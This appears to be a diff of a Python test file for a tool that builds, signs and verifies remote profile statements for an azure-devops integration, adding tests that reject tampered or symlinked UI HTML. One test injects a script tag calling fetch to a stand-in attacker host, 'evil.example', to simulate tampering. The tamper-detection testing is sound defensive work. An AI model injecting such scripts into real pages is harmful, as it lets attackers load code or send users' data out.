@@ -94,7 +94,7 @@ def test_build_writes_the_canonical_statement(remote_dir: Path, tmp_path: Path) 
     assert (
         main(["remote", "build", str(remote_dir), "--revision", REVISION, "--out", str(out)]) == 0
     )
-    written = out / "azure-devops-2026.10.27-4.statement.json"
+    written = out / "azure-devops-2026.10.27-5.statement.json"
     statement = statement_for(load_remote(remote_dir), REVISION)
     assert written.read_bytes() == statement.payload()
     # The schema travels inside the statement: the provisioner needs no other file.
@@ -125,7 +125,7 @@ def test_verify_command(
     key = tmp_path / "key.pub"
     key.write_bytes(signer.public_key_pem())
     assert main(["remote", "verify", "--envelope", str(envelope), "--public-key", str(key)]) == 0
-    assert "verified azure-devops 2026.10.27-4" in capsys.readouterr().out
+    assert "verified azure-devops 2026.10.27-5" in capsys.readouterr().out
     key.write_bytes(
         KmsSigner(
             FakeKms(ec.generate_private_key(ec.SECP256R1()), "ECC_NIST_P256"), "x"
@@ -138,3 +138,29 @@ def test_a_missing_schema_is_an_error(remote_dir: Path) -> None:
     (remote_dir / "tool-schema.json").unlink()
     with pytest.raises(RemoteProfileError, match="not found"):
         load_remote(remote_dir)
+
+
+def test_check_refuses_an_app_whose_html_changed(
+    remote_dir: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    path = remote_dir / "ui" / "work-items.html"
+    path.write_text(path.read_text() + "<script>fetch('https://evil.example')</script>")
+    assert "the HTML of ui://azure-devops/work-items changed" in _check(remote_dir, capsys)
+
+
+def test_check_refuses_an_app_whose_html_is_a_link(
+    remote_dir: Path, tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    path = remote_dir / "ui" / "work-items.html"
+    outside = tmp_path / "outside.html"
+    outside.write_bytes(path.read_bytes())
+    path.unlink()
+    path.symlink_to(outside)
+    assert "is a link" in _check(remote_dir, capsys)
+
+
+def test_the_statement_carries_the_html_of_the_app(remote_dir: Path) -> None:
+    remote = load_remote(remote_dir)
+    html = (remote_dir / "ui" / "work-items.html").read_text()
+    assert remote.ui_resources == {"ui://azure-devops/work-items": html}
+    assert statement_for(remote, REVISION).ui_resources == remote.ui_resources
